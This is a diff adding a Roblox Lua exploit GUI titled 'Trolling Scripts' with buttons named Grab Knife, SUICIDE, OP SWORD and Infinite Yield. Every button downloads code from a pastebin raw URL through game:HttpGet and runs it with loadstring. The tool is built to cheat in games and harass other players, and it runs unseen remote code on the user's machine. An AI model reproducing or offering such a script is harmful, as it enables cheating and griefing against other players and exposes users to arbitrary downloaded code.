@@ -1,0 +1,110 @@
+-- Made By DarkMEMExV2
+-- XD
+-- Unintralls
+local MainScrren = Instance.new("ScreenGui")
+local MainGUI = Instance.new("Frame")
+local NameScripts = Instance.new("TextLabel")
+local MadeBy = Instance.new("TextLabel")
+local GrabKnife = Instance.new("TextButton")
+local SUICIDE = Instance.new("TextButton")
+local FEunable = Instance.new("TextLabel")
+local OPSWORD = Instance.new("TextButton")
+local InfiniteYield = Instance.new("TextButton")
+--Properties:
+MainScrren.Name = "Main Scrren"
+MainScrren.Parent = game.CoreGui
+MainScrren.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ 
+MainGUI.Name = "Main GUI"
+MainGUI.Parent = MainScrren
+MainGUI.BackgroundColor3 = Color3.new(0, 1, 1)
+MainGUI.Position = UDim2.new(0.527999997, 0, 0.111285269, 0)
+MainGUI.Size = UDim2.new(0, 372, 0, 462)
+ 
+NameScripts.Name = "NameScripts"
+NameScripts.Parent = MainGUI
+NameScripts.BackgroundColor3 = Color3.new(0, 1, 0)
+NameScripts.Position = UDim2.new(-0.00156986713, 0, -0.00126884133, 0)
+NameScripts.Size = UDim2.new(0, 372, 0, 25)
+NameScripts.Font = Enum.Font.SciFi
+NameScripts.Text = "Trolling Scripts"
+NameScripts.TextColor3 = Color3.new(0, 0, 0)
+NameScripts.TextSize = 24
+ 
+MadeBy.Name = "Made By"
+MadeBy.Parent = MainGUI
+MadeBy.BackgroundColor3 = Color3.new(0, 1, 0)
+MadeBy.Position = UDim2.new(-0.00156985049, 0, 0.95185858, 0)
+MadeBy.Size = UDim2.new(0, 372, 0, 22)
+MadeBy.Font = Enum.Font.SciFi
+MadeBy.Text = "Made By DarkMEMExV2"
+MadeBy.TextColor3 = Color3.new(0, 0, 0)
+MadeBy.TextScaled = true
+MadeBy.TextSize = 24
+MadeBy.TextWrapped = true
+ 
+GrabKnife.Name = "Grab Knife"
+GrabKnife.Parent = MainGUI
+GrabKnife.BackgroundColor3 = Color3.new(1, 0, 0)
+GrabKnife.Position = UDim2.new(0.0515330434, 0, 0.125765026, 0)
+GrabKnife.Size = UDim2.new(0, 147, 0, 68)
+GrabKnife.Font = Enum.Font.SciFi
+GrabKnife.Text = "Grab Knife V3"
+GrabKnife.TextColor3 = Color3.new(0, 0, 0)
+GrabKnife.TextSize = 24
+GrabKnife.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/vXgWessT", true))()
+end)
+ 
+ 
+SUICIDE.Name = "SUICIDE"
+SUICIDE.Parent = MainGUI
+SUICIDE.BackgroundColor3 = Color3.new(1, 0, 0)
+SUICIDE.Position = UDim2.new(0.524193585, 0, 0.125765026, 0)
+SUICIDE.Size = UDim2.new(0, 167, 0, 68)
+SUICIDE.Font = Enum.Font.SciFi
+SUICIDE.Text = "SUICIDE"
+SUICIDE.TextColor3 = Color3.new(0, 0, 0)
+SUICIDE.TextSize = 24
+SUICIDE.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/SeRxrgci", true))()
+end)
+ 
+FEunable.Name = "FE unable"
+FEunable.Parent = MainGUI
+FEunable.BackgroundColor3 = Color3.new(1, 1, 1)
+FEunable.Position = UDim2.new(0.0510752685, 0, 0.093297489, 0)
+FEunable.Size = UDim2.new(0, 147, 0, 15)
+FEunable.Font = Enum.Font.SciFi
+FEunable.Text = "FE UNABLE"
+FEunable.TextColor3 = Color3.new(0, 0, 0)
+FEunable.TextSize = 24
+ 
+OPSWORD.Name = "OP SWORD"
+OPSWORD.Parent = MainGUI
+OPSWORD.BackgroundColor3 = Color3.new(1, 0, 0)
+OPSWORD.Position = UDim2.new(0.0752688125, 0, 0.33116883, 0)
+OPSWORD.Size = UDim2.new(0, 313, 0, 103)
+OPSWORD.Font = Enum.Font.SciFi
+OPSWORD.Text = "OP SWORD BEST"
+OPSWORD.TextColor3 = Color3.new(0, 0, 0)
+OPSWORD.TextSize = 25
+OPSWORD.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/SSFW6seG", true))()
+end)
+ 
+InfiniteYield.Name = "Infinite Yield"
+InfiniteYield.Parent = MainGUI
+InfiniteYield.BackgroundColor3 = Color3.new(1, 0, 0)
+InfiniteYield.Position = UDim2.new(0.0510752685, 0, 0.621212125, 0)
+InfiniteYield.Size = UDim2.new(0, 333, 0, 140)
+InfiniteYield.Font = Enum.Font.SciFi
+InfiniteYield.Text = "Infinite Yield"
+InfiniteYield.TextColor3 = Color3.new(0, 0, 0)
+InfiniteYield.TextSize = 25
+InfiniteYield.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/grxBK4H0", true))()
+end)
+ 
+print('LoadedX2')
+-- Scripts:
